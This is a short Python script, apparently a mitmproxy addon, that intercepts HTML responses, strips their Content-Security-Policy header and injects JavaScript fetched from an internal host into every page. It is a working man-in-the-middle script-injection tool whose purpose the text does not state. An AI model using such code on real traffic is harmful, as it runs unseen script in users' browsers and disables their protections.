import sys
import requests
# the mock-0.3.1 dir contains testcase.py, testutils.py & mock.py
sys.path.append('/opt/project/bs4')
sys.path.append('/opt/project/netlib')

from pprint import pprint

#from bs4 import BeautifulSoup
from netlib.http import decoded


def start(context = [], argv = []):
    print ('Random Start!')


def response(flow):
    print ('Response Detected')

    #pprint(flow)

    response = requests.get("http://internal/js/welcome.js")

    if flow.request.host in "http://internal/js/welcome.js":
        return  # Make sure JS isn't injected to itself

    if "Content-Security-Policy" in flow.response.headers:
        flow.response.headers["Content-Security-Policy"] = "upgrade-insecure-requests"

    if "text/html" in flow.response.headers["content-type"] :     # inject only for HTML resources
        print ('Has Body') 
         
        pprint(type(flow.response.content))
        flow.response.content = flow.response.content.replace(bytes('</body>', 'utf-8'), bytes('</body><script>'+ response.text  +'</script>', 'utf-8'))


# def read_file(filename):
#     with open(filename) as f:
#         return f.read()